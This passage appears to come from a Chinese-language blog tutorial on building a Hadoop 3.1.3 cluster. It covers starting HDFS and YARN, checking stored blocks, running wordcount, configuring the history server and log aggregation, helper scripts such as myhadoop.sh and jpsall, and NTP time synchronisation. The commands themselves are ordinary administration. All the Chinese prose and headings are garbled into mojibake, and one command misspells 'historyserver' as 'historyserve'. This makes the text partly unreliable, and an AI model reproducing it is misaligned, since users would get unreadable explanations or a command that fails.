<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop102 ~]$ cd /opt/module/hadoop-3.1.3/</span><br><span class="line">[huang@hadoop102 hadoop-3.1.3]$ hdfs namenode -format</span><br></pre></td></tr></table></figure>

<p>2.å¯åŠ¨HDFS</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop102 hadoop-3.1.3]$ sbin/start-dfs.sh</span><br></pre></td></tr></table></figure>

<p>3.åœ¨é…ç½®äº†ResourceManageçš„èŠ‚ç‚¹ï¼ˆhadoop103ï¼‰å¯åŠ¨yarn</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop102 hadoop-3.1.3]$ ssh hadoop103</span><br><span class="line">Last login: Thu Jul  1 01:56:53 2021 from hadoop110</span><br><span class="line">[huang@hadoop103 ~]$ cd /opt/module/hadoop-3.1.3/</span><br><span class="line">[huang@hadoop103 hadoop-3.1.3]$ sbin/start-yarn.sh </span><br></pre></td></tr></table></figure>

<p>4.Web ç«¯æŸ¥çœ‹ HDFS çš„ NameNode</p>
<ul>
<li><p>æµè§ˆå™¨ä¸­è¾“å…¥:<a href="http://hadoop102:9870/">http://hadoop102:9870</a></p>
</li>
<li><p>æŸ¥çœ‹ HDFS ä¸Šå­˜å‚¨çš„æ•°æ®ä¿¡æ¯</p>
</li>
</ul>
<p>5.Web ç«¯æŸ¥çœ‹ YARN çš„ ResourceManager</p>
<ul>
<li><p>æµè§ˆå™¨ä¸­è¾“å…¥:<a href="http://hadoop103:8088/">http://hadoop103:8088</a></p>
</li>
<li><p>æŸ¥çœ‹ YARN ä¸Šè¿è¡Œçš„ Job ä¿¡æ¯</p>
</li>
</ul>
<h4 id="é›†ç¾¤æµ‹è¯•"><a href="#é›†ç¾¤æµ‹è¯•" class="headerlink" title="é›†ç¾¤æµ‹è¯•"></a>é›†ç¾¤æµ‹è¯•</h4><h5 id="ä¸Šä¼ æ–‡ä»¶åˆ°é›†ç¾¤"><a href="#ä¸Šä¼ æ–‡ä»¶åˆ°é›†ç¾¤" class="headerlink" title="ä¸Šä¼ æ–‡ä»¶åˆ°é›†ç¾¤"></a>ä¸Šä¼ æ–‡ä»¶åˆ°é›†ç¾¤</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">å°æ–‡ä»¶</span></span><br><span class="line">[huang@hadoop102 hadoop-3.1.3]$ cd input/</span><br><span class="line">[huang@hadoop102 wcinput]$ vi word.txt</span><br><span class="line">[huang@hadoop102 wcinput]$ hadoop fs -mkdir /input</span><br><span class="line">[huang@hadoop102 wcinput]$ hadoop fs -put /opt/module/hadoop-3.1.3/input/word.txt /input</span><br><span class="line"><span class="meta">#</span><span class="language-bash">å¤§æ–‡ä»¶</span></span><br><span class="line">[huang@hadoop102 ~]$ hadoop fs -put /opt/software/jdk-8u212-linux-x64.tar.gz /</span><br><span class="line">2021-07-01 17:24:44,908 INFO sasl.SaslDataTransferClient: SASL encryption trust check: localHostTrusted = false, remoteHostTrusted = false</span><br><span class="line">2021-07-01 17:25:44,619 INFO sasl.SaslDataTransferClient: SASL encryption trust check: localHostTrusted = false, remoteHostTrusted = false</span><br></pre></td></tr></table></figure>

<h5 id="ä¸Šä¼ æ–‡ä»¶åæŸ¥çœ‹æ–‡ä»¶å­˜æ”¾åœ¨ä»€ä¹ˆä½ç½®"><a href="#ä¸Šä¼ æ–‡ä»¶åæŸ¥çœ‹æ–‡ä»¶å­˜æ”¾åœ¨ä»€ä¹ˆä½ç½®" class="headerlink" title="ä¸Šä¼ æ–‡ä»¶åæŸ¥çœ‹æ–‡ä»¶å­˜æ”¾åœ¨ä»€ä¹ˆä½ç½®"></a>ä¸Šä¼ æ–‡ä»¶åæŸ¥çœ‹æ–‡ä»¶å­˜æ”¾åœ¨ä»€ä¹ˆä½ç½®</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop102 hadoop-3.1.3]$ cd /opt/module/hadoop-3.1.3/data/dfs/data/current/BP-982674778-192.168.58.31-1625131269672/current/finalized/subdir0/subdir0/</span><br><span class="line">[huang@hadoop102 subdir0]$ ll</span><br><span class="line">æ€»ç”¨é‡ 191948</span><br><span class="line">-rw-rw-r--. 1 huang huang 134217728 7æœˆ   1 17:25 blk_1073741825</span><br><span class="line">-rw-rw-r--. 1 huang huang   1048583 7æœˆ   1 17:25 blk_1073741825_1001.meta</span><br><span class="line">-rw-rw-r--. 1 huang huang  60795424 7æœˆ   1 17:25 blk_1073741826</span><br><span class="line">-rw-rw-r--. 1 huang huang    474975 7æœˆ   1 17:25 blk_1073741826_1002.meta</span><br><span class="line">-rw-rw-r--. 1 huang huang       166 7æœˆ   1 17:28 blk_1073741827</span><br><span class="line">-rw-rw-r--. 1 huang huang        11 7æœˆ   1 17:28 blk_1073741827_1003.meta</span><br><span class="line">[huang@hadoop102 subdir0]$ cat blk_1073741827</span><br><span class="line">huang huang ming ming wang</span><br><span class="line">huangmingwang</span><br><span class="line">hadoop hadoop hadoop </span><br><span class="line">mapreduce</span><br><span class="line">mapreduce</span><br><span class="line">huang</span><br><span class="line">huang</span><br><span class="line">huang</span><br><span class="line">huang</span><br><span class="line">ming</span><br><span class="line">ming</span><br><span class="line">ming</span><br><span class="line">wang</span><br><span class="line">wang wang hadoop</span><br><span class="line">hadoop hadoop hadoop </span><br></pre></td></tr></table></figure>

<h5 id="æ‹¼æ¥æ–‡ä»¶"><a href="#æ‹¼æ¥æ–‡ä»¶" class="headerlink" title="æ‹¼æ¥æ–‡ä»¶"></a>æ‹¼æ¥æ–‡ä»¶</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop102 subdir0]$ cat blk_1073741825 &gt;&gt; tmp.tar.gz</span><br><span class="line">[huang@hadoop102 subdir0]$ cat blk_1073741826 &gt;&gt; tmp.tar.gz</span><br><span class="line">[huang@hadoop102 subdir0]$ tar -zxvf tmp.tar.gz </span><br><span class="line"></span><br><span class="line">[huang@hadoop102 subdir0]$ ll</span><br><span class="line">æ€»ç”¨é‡ 382396</span><br><span class="line">-rw-rw-r--. 1 huang huang 134217728 7æœˆ   1 17:25 blk_1073741825</span><br><span class="line">-rw-rw-r--. 1 huang huang   1048583 7æœˆ   1 17:25 blk_1073741825_1001.meta</span><br><span class="line">-rw-rw-r--. 1 huang huang  60795424 7æœˆ   1 17:25 blk_1073741826</span><br><span class="line">-rw-rw-r--. 1 huang huang    474975 7æœˆ   1 17:25 blk_1073741826_1002.meta</span><br><span class="line">-rw-rw-r--. 1 huang huang       166 7æœˆ   1 17:28 blk_1073741827</span><br><span class="line">-rw-rw-r--. 1 huang huang        11 7æœˆ   1 17:28 blk_1073741827_1003.meta</span><br><span class="line">drwxr-xr-x. 7 huang huang      4096 4æœˆ   2 2019 jdk1.8.0_212</span><br><span class="line">-rw-rw-r--. 1 huang huang 195013152 7æœˆ   1 17:30 tmp.tar.gz</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h5 id="ä¸‹è½½"><a href="#ä¸‹è½½" class="headerlink" title="ä¸‹è½½"></a>ä¸‹è½½</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop102 ~]$ cd /opt/software/</span><br><span class="line">[huang@hadoop102 software]$ rm -rf jdk-8u212-linux-x64.tar.gz </span><br><span class="line">[huang@hadoop102 software]$ hadoop fs -get /jdk-8u212-linux-x64.tar.gz ./</span><br><span class="line">[huang@hadoop102 software]$ ll</span><br></pre></td></tr></table></figure>

<h5 id="æ‰§è¡Œwordcountç¨‹åº"><a href="#æ‰§è¡Œwordcountç¨‹åº" class="headerlink" title="æ‰§è¡Œwordcountç¨‹åº"></a>æ‰§è¡Œwordcountç¨‹åº</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop102 hadoop-3.1.3]$ hadoop jar $HADOOP_HOME/share/hadoop/mapreduce/hadoop-mapreduce-examples-3.1.3.jar wordcount /input /output</span><br></pre></td></tr></table></figure>

<h3 id="é…ç½®å†å²æœåŠ¡å™¨"><a href="#é…ç½®å†å²æœåŠ¡å™¨" class="headerlink" title="é…ç½®å†å²æœåŠ¡å™¨"></a>é…ç½®å†å²æœåŠ¡å™¨</h3><p>1.é…ç½® mapred-site.xml</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop102 hadoop-3.1.3]$ cd /opt/module/hadoop-3.1.3/etc/hadoop/</span><br><span class="line">[huang@hadoop102 hadoop]$ vi mapred-site.xml</span><br></pre></td></tr></table></figure>

<p>åœ¨è¯¥æ–‡ä»¶ä¸­å¢åŠ å¦‚ä¸‹é…ç½®ï¼š</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- å†å²æœåŠ¡å™¨ç«¯åœ°å€ --&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">name</span>&gt;</span>mapreduce.jobhistory.address<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">value</span>&gt;</span>hadoop102:10020<span class="tag">&lt;/<span class="name">value</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- å†å²æœåŠ¡å™¨ web ç«¯åœ°å€ --&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">name</span>&gt;</span>mapreduce.jobhistory.webapp.address<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">value</span>&gt;</span>hadoop102:19888<span class="tag">&lt;/<span class="name">value</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>2.åˆ†å‘é…ç½®</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop102 hadoop]$ xsync /opt/module/hadoop-3.1.3/etc/</span><br></pre></td></tr></table></figure>

<p>3.åœ¨ hadoop102 å¯åŠ¨å†å²æœåŠ¡å™¨</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop102 hadoop-3.1.3]$ mapred --daemon start historyserve</span><br><span class="line"><span class="meta"># </span><span class="language-bash">æŸ¥çœ‹æ˜¯å¦å¯åŠ¨</span></span><br><span class="line">[huang@hadoop102 hadoop-3.1.3]$ jps</span><br><span class="line">29072 JobHistoryServer</span><br><span class="line">29146 Jps</span><br><span class="line">16923 DataNode</span><br><span class="line">16748 NameNode</span><br><span class="line">17454 NodeManager</span><br></pre></td></tr></table></figure>

<h3 id="é…ç½®æ—¥å¿—çš„èšé›†"><a href="#é…ç½®æ—¥å¿—çš„èšé›†" class="headerlink" title="é…ç½®æ—¥å¿—çš„èšé›†"></a>é…ç½®æ—¥å¿—çš„èšé›†</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop102 ~]$ cd /opt/module/hadoop-3.1.3/etc/hadoop/</span><br><span class="line">[huang@hadoop102 hadoop]$ vi yarn-site.xml </span><br></pre></td></tr></table></figure>

<p>å†…å®¹å¦‚ä¸‹ï¼š</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- å¼€å¯æ—¥å¿—èšé›†åŠŸèƒ½ --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.log-aggregation-enable<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">value</span>&gt;</span>true<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- è®¾ç½®æ—¥å¿—èšé›†æœåŠ¡å™¨åœ°å€ --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span> </span><br><span class="line">	<span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.log.server.url<span class="tag">&lt;/<span class="name">name</span>&gt;</span> </span><br><span class="line">	<span class="tag">&lt;<span class="name">value</span>&gt;</span>http://hadoop102:19888/jobhistory/logs<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- è®¾ç½®æ—¥å¿—ä¿ç•™æ—¶é—´ä¸º 7 å¤© --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.log-aggregation.retain-seconds<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">value</span>&gt;</span>604800<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br></pre></td></tr></table></figure>



<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">åˆ†å‘é…ç½®</span></span><br><span class="line">[huang@hadoop102 hadoop]$ xsync /opt/module/hadoop-3.1.3/etc/hadoop/yarn-site.xml </span><br><span class="line"><span class="meta">#</span><span class="language-bash">é‡å¯NodeManager ã€ResourceManager å’Œ HistoryServer</span></span><br><span class="line">[huang@hadoop102 hadoop]$ myhadoop.sh stop</span><br><span class="line"> =================== å…³é—­ hadoop é›†ç¾¤ ===================</span><br><span class="line"> --------------- å…³é—­ historyserver ---------------</span><br><span class="line"> --------------- å…³é—­ yarn ---------------</span><br><span class="line">Stopping nodemanagers</span><br><span class="line">Stopping resourcemanager</span><br><span class="line"> --------------- å…³é—­ hdfs ---------------</span><br><span class="line">Stopping namenodes on [hadoop102]</span><br><span class="line">Stopping datanodes</span><br><span class="line">Stopping secondary namenodes [hadoop104]</span><br><span class="line">[huang@hadoop102 hadoop]$ myhadoop.sh start</span><br><span class="line"> =================== å¯åŠ¨ hadoop é›†ç¾¤ ===================</span><br><span class="line"> --------------- å¯åŠ¨ hdfs ---------------</span><br><span class="line">Starting namenodes on [hadoop102]</span><br><span class="line">Starting datanodes</span><br><span class="line">Starting secondary namenodes [hadoop104]</span><br><span class="line"> --------------- å¯åŠ¨ yarn ---------------</span><br><span class="line">Starting resourcemanager</span><br><span class="line">Starting nodemanagers</span><br><span class="line"> --------------- å¯åŠ¨ historyserver ---------------</span><br></pre></td></tr></table></figure>



<h3 id="é›†ç¾¤å¯åŠ¨å’Œåœæ­¢æ–¹å¼"><a href="#é›†ç¾¤å¯åŠ¨å’Œåœæ­¢æ–¹å¼" class="headerlink" title="é›†ç¾¤å¯åŠ¨å’Œåœæ­¢æ–¹å¼"></a>é›†ç¾¤å¯åŠ¨å’Œåœæ­¢æ–¹å¼</h3><h4 id="å„ä¸ªæ¨¡å—åˆ†å¼€å¯åŠ¨-x2F-åœæ­¢ï¼ˆé…ç½®sshæ˜¯å‰æï¼‰å¸¸ç”¨"><a href="#å„ä¸ªæ¨¡å—åˆ†å¼€å¯åŠ¨-x2F-åœæ­¢ï¼ˆé…ç½®sshæ˜¯å‰æï¼‰å¸¸ç”¨" class="headerlink" title="å„ä¸ªæ¨¡å—åˆ†å¼€å¯åŠ¨&#x2F;åœæ­¢ï¼ˆé…ç½®sshæ˜¯å‰æï¼‰å¸¸ç”¨"></a>å„ä¸ªæ¨¡å—åˆ†å¼€å¯åŠ¨&#x2F;åœæ­¢ï¼ˆé…ç½®sshæ˜¯å‰æï¼‰å¸¸ç”¨</h4><p>1.æ•´ä½“å¯åŠ¨&#x2F;åœæ­¢HDFS</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">start-dfs.sh/stop-dfs.sh</span><br></pre></td></tr></table></figure>

<p>2.æ•´ä½“å¯åŠ¨&#x2F;åœæ­¢YARN</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">start-yarn.sh/stop-yarn.sh</span><br></pre></td></tr></table></figure>

<h4 id="å„ä¸ªæœåŠ¡é€ä¸€å¯åŠ¨-x2F-åœæ­¢"><a href="#å„ä¸ªæœåŠ¡é€ä¸€å¯åŠ¨-x2F-åœæ­¢" class="headerlink" title="å„ä¸ªæœåŠ¡é€ä¸€å¯åŠ¨&#x2F;åœæ­¢"></a>å„ä¸ªæœåŠ¡é€ä¸€å¯åŠ¨&#x2F;åœæ­¢</h4><p>1.åˆ†åˆ«å¯åŠ¨&#x2F;åœæ­¢HDFSç»„ä»¶</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hdfs --daemon start/stop namenode/datanode/secondarynamenode</span><br></pre></td></tr></table></figure>

<p>2.å¯åŠ¨&#x2F;åœæ­¢YARN</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yarn --daemon start/stop resourcemanager/nodemanager</span><br></pre></td></tr></table></figure>

<h3 id="ç¼–å†™Hadoopé›†ç¾¤å¸¸ç”¨è„šæœ¬"><a href="#ç¼–å†™Hadoopé›†ç¾¤å¸¸ç”¨è„šæœ¬" class="headerlink" title="ç¼–å†™Hadoopé›†ç¾¤å¸¸ç”¨è„šæœ¬"></a>ç¼–å†™Hadoopé›†ç¾¤å¸¸ç”¨è„šæœ¬</h3><h4 id="Hadoop-é›†ç¾¤å¯åœè„šæœ¬-åŒ…å«-HDFSï¼ŒYarnï¼ŒHistoryserver-myhadoop-sh"><a href="#Hadoop-é›†ç¾¤å¯åœè„šæœ¬-åŒ…å«-HDFSï¼ŒYarnï¼ŒHistoryserver-myhadoop-sh" class="headerlink" title="Hadoop é›†ç¾¤å¯åœè„šæœ¬(åŒ…å« HDFSï¼ŒYarnï¼ŒHistoryserver):myhadoop.sh"></a>Hadoop é›†ç¾¤å¯åœè„šæœ¬(åŒ…å« HDFSï¼ŒYarnï¼ŒHistoryserver):myhadoop.sh</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop102 hadoop-3.1.3]$ cd /home/huang/bin/</span><br><span class="line">[huang@hadoop102 bin]$ vi myhadoop.sh</span><br></pre></td></tr></table></figure>

<p>æ–‡ä»¶å†…å®¹å¦‚ä¸‹ï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">if [ $# -lt 1 ]</span><br><span class="line">then</span><br><span class="line">		echo &quot;No Args Input...&quot;</span><br><span class="line">		exit ; </span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">case $1 in </span><br><span class="line">&quot;start&quot;)</span><br><span class="line">	echo &quot; =================== å¯åŠ¨ hadoop é›†ç¾¤ ===================&quot;</span><br><span class="line">	echo &quot; --------------- å¯åŠ¨ hdfs ---------------&quot;</span><br><span class="line">	ssh hadoop102 &quot;/opt/module/hadoop-3.1.3/sbin/start-dfs.sh&quot; </span><br><span class="line">	echo &quot; --------------- å¯åŠ¨ yarn ---------------&quot;</span><br><span class="line">	ssh hadoop103 &quot;/opt/module/hadoop-3.1.3/sbin/start-yarn.sh&quot;</span><br><span class="line">	echo &quot; --------------- å¯åŠ¨ historyserver ---------------&quot;</span><br><span class="line">	ssh hadoop102 &quot;/opt/module/hadoop-3.1.3/bin/mapred --daemon start historyserver&quot;</span><br><span class="line">;;</span><br><span class="line">&quot;stop&quot;)</span><br><span class="line">	echo &quot; =================== å…³é—­ hadoop é›†ç¾¤ ===================&quot;</span><br><span class="line">	echo &quot; --------------- å…³é—­ historyserver ---------------&quot;</span><br><span class="line">	ssh hadoop102 &quot;/opt/module/hadoop-3.1.3/bin/mapred --daemon stop historyserver&quot;</span><br><span class="line">	echo &quot; --------------- å…³é—­ yarn ---------------&quot;</span><br><span class="line">	ssh hadoop103 &quot;/opt/module/hadoop-3.1.3/sbin/stop-yarn.sh&quot; </span><br><span class="line">	echo &quot; --------------- å…³é—­ hdfs ---------------&quot;</span><br><span class="line">	ssh hadoop102 &quot;/opt/module/hadoop-3.1.3/sbin/stop-dfs.sh&quot;</span><br><span class="line">;;</span><br><span class="line">*)</span><br><span class="line">   echo &quot;Input Args Error...&quot;</span><br><span class="line">;; </span><br><span class="line">esac</span><br></pre></td></tr></table></figure>



<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">èµ‹äºˆè„šæœ¬æ‰§è¡Œæƒé™</span></span><br><span class="line">[huang@hadoop102 bin]$ chmod +x myhadoop.sh </span><br><span class="line"><span class="meta">#</span><span class="language-bash">å°†è„šæœ¬å¤åˆ¶åˆ°/binï¼Œä»¥ä¾¿å…¨å±€è°ƒç”¨</span></span><br><span class="line">[huang@hadoop102 bin]$ sudo cp myhadoop.sh /bin/</span><br><span class="line"><span class="meta">#</span><span class="language-bash">åˆ†å‘è„šæœ¬</span></span><br><span class="line">[huang@hadoop102 ~]$ xsync /home/huang/bin/</span><br></pre></td></tr></table></figure>

<h4 id="æŸ¥çœ‹ä¸‰å°æœåŠ¡å™¨Javaè¿›ç¨‹è„šæœ¬ï¼šjpsall"><a href="#æŸ¥çœ‹ä¸‰å°æœåŠ¡å™¨Javaè¿›ç¨‹è„šæœ¬ï¼šjpsall" class="headerlink" title="æŸ¥çœ‹ä¸‰å°æœåŠ¡å™¨Javaè¿›ç¨‹è„šæœ¬ï¼šjpsall"></a>æŸ¥çœ‹ä¸‰å°æœåŠ¡å™¨Javaè¿›ç¨‹è„šæœ¬ï¼šjpsall</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop102 ~]$ cd /home/huang/bin/</span><br><span class="line">[huang@hadoop102 bin]$ vi jpsall</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">for host in hadoop102 hadoop103 hadoop104 </span><br><span class="line">do</span><br><span class="line">	echo =============== $host ===============</span><br><span class="line">  ssh $host jps</span><br><span class="line">done</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">èµ‹äºˆæ‰§è¡Œæƒé™</span></span><br><span class="line">[huang@hadoop102 bin]$ chmod +x jpsall</span><br><span class="line"><span class="meta">#</span><span class="language-bash">å°†è„šæœ¬å¤åˆ¶åˆ°/binï¼Œä»¥ä¾¿å…¨å±€è°ƒç”¨</span></span><br><span class="line">[huang@hadoop102 bin]$ sudo cp jpsall /bin/</span><br><span class="line"><span class="meta">#</span><span class="language-bash">åˆ†å‘è„šæœ¬</span></span><br><span class="line">[huang@hadoop102 ~]$ xsync /home/huang/bin/</span><br></pre></td></tr></table></figure>

<h3 id="å¸¸ç”¨ç«¯å£å·"><a href="#å¸¸ç”¨ç«¯å£å·" class="headerlink" title="å¸¸ç”¨ç«¯å£å·"></a>å¸¸ç”¨ç«¯å£å·</h3><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220115386.png" alt="image-20210628130455175"></p>
<h3 id="é›†ç¾¤å†…æ—¶é—´åŒæ­¥"><a href="#é›†ç¾¤å†…æ—¶é—´åŒæ­¥" class="headerlink" title="é›†ç¾¤å†…æ—¶é—´åŒæ­¥"></a>é›†ç¾¤å†…æ—¶é—´åŒæ­¥</h3><p>å¦‚æœæœåŠ¡å™¨åœ¨å…¬ç½‘ç¯å¢ƒ(èƒ½è¿æ¥å¤–ç½‘)ï¼Œå¯ä»¥ä¸é‡‡ç”¨é›†ç¾¤æ—¶é—´åŒæ­¥ï¼Œå› ä¸ºæœåŠ¡å™¨ä¼šå®šæœŸ å’Œå…¬ç½‘æ—¶é—´è¿›è¡Œæ ¡å‡†;</p>
<p>å¦‚æœæœåŠ¡å™¨åœ¨å†…ç½‘ç¯å¢ƒï¼Œå¿…é¡»è¦é…ç½®é›†ç¾¤æ—¶é—´åŒæ­¥ï¼Œå¦åˆ™æ—¶é—´ä¹…äº†ï¼Œä¼šäº§ç”Ÿæ—¶é—´åå·®ï¼Œ å¯¼è‡´é›†ç¾¤æ‰§è¡Œä»»åŠ¡æ—¶é—´ä¸åŒæ­¥ã€‚</p>
<h4 id="éœ€æ±‚"><a href="#éœ€æ±‚" class="headerlink" title="éœ€æ±‚"></a>éœ€æ±‚</h4><p>æ‰¾ä¸€ä¸ªæœºå™¨ï¼Œä½œä¸ºæ—¶é—´æœåŠ¡å™¨ï¼Œæ‰€æœ‰çš„æœºå™¨ä¸è¿™å°é›†ç¾¤æ—¶é—´è¿›è¡Œå®šæ—¶çš„åŒæ­¥ï¼Œç”Ÿäº§ç¯å¢ƒæ ¹æ®ä»»åŠ¡å¯¹æ—¶é—´çš„å‡†ç¡®ç¨‹åº¦è¦æ±‚å‘¨æœŸåŒæ­¥ã€‚æµ‹è¯•ç¯å¢ƒä¸ºäº†å°½å¿«çœ‹åˆ°æ•ˆæœï¼Œé‡‡ç”¨ 1 åˆ†é’ŸåŒæ­¥ä¸€ æ¬¡ã€‚</p>
<h4 id="æ—¶é—´æœåŠ¡å™¨é…ç½®ï¼ˆå¿…é¡»rootç”¨æˆ·ï¼‰"><a href="#æ—¶é—´æœåŠ¡å™¨é…ç½®ï¼ˆå¿…é¡»rootç”¨æˆ·ï¼‰" class="headerlink" title="æ—¶é—´æœåŠ¡å™¨é…ç½®ï¼ˆå¿…é¡»rootç”¨æˆ·ï¼‰"></a>æ—¶é—´æœåŠ¡å™¨é…ç½®ï¼ˆå¿…é¡»rootç”¨æˆ·ï¼‰</h4><p>1.æŸ¥çœ‹æ‰€æœ‰èŠ‚ç‚¹ ntpd æœåŠ¡çŠ¶æ€å’Œå¼€æœºè‡ªå¯åŠ¨çŠ¶æ€</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop102 ~]$ sudo systemctl status ntpd</span><br><span class="line">[huang@hadoop102 ~]$ sudo systemctl start ntpd</span><br><span class="line">[huang@hadoop102 ~]$ sudo systemctl is-enabled ntpd</span><br><span class="line">[huang@hadoop102 ~]$ sudo systemctl status ntpd</span><br></pre></td></tr></table></figure>

<p>2.ä¿®æ”¹hadoop102çš„ntp.confé…ç½®æ–‡ä»¶</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop102 ~]$ sudo vi /etc/ntp.conf </span><br><span class="line"><span class="meta"># </span><span class="language-bash">Hosts on <span class="built_in">local</span> network are less restricted.</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">restrict 192.168.1.0 mask 255.255.255.0 nomodify notrap</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">æˆæƒ 192.168.58.0-192.168.58.255 ç½‘æ®µä¸Šçš„æ‰€æœ‰æœºå™¨å¯ä»¥ä»è¿™å°æœºå™¨ä¸ŠæŸ¥è¯¢å’ŒåŒæ­¥æ—¶é—´</span></span><br><span class="line">restrict 192.168.58.0 mask 255.255.255.0 nomodify notrap</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">Use public servers from the pool.ntp.org project.</span> </span><br><span class="line"><span class="meta"># </span><span class="language-bash">Please consider joining the pool (http://www.pool.ntp.org/join.html).</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">é›†ç¾¤åœ¨å±€åŸŸç½‘ä¸­ä¸ä½¿ç”¨å…¶ä»–äº’è”ç½‘ä¸Šçš„æ—¶é—´ï¼Œä¸‹é¢4ä¸ªéƒ½æ³¨é‡Šæ‰</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">server 0.centos.pool.ntp.org iburst</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">server 1.centos.pool.ntp.org iburst</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">server 2.centos.pool.ntp.org iburst</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">server 3.centos.pool.ntp.org iburst</span></span><br><span class="line">server 127.127.1.0 #127.127.1.0 ä¸æ˜¯IP åœ°å€ã€‚ å®ƒæ˜¯ä¸€ç§æ ¼å¼ï¼Œç”¨æ¥å¼•ç”¨å‘æœåŠ¡å™¨æä¾›å‡†ç¡®æ—¶é—´çš„æ—¶é’Ÿã€‚</span><br><span class="line">fudge 127.127.1.0 stratum 10</span><br><span class="line"></span><br><span class="line">[huang@hadoop102 ~]$ sudo vi /etc/sysconfig/ntpd</span><br><span class="line"><span class="meta">#</span><span class="language-bash">å¢åŠ å†…å®¹å¦‚ä¸‹ï¼ˆè®©ç¡¬ä»¶æ—¶é—´ä¸ç³»ç»Ÿæ—¶é—´ä¸€èµ·åŒæ­¥ï¼‰</span></span><br><span class="line">SYNC_HWCLOCK=yes</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">å¯åŠ¨ntpd</span></span><br><span class="line">[huang@hadoop102 ~]$ sudo systemctl start ntpd</span><br><span class="line"><span class="meta">#</span><span class="language-bash">è®¾ç½®å¼€æœºè‡ªå¯</span></span><br><span class="line">[huang@hadoop102 ~]$ sudo systemctl enable ntpd</span><br></pre></td></tr></table></figure>

<p>3.å…¶ä»–æœºå™¨é…ç½®ï¼ˆå¿…é¡»rootç”¨æˆ·,å·²hadoop103ä¸ºä¾‹ï¼‰</p>
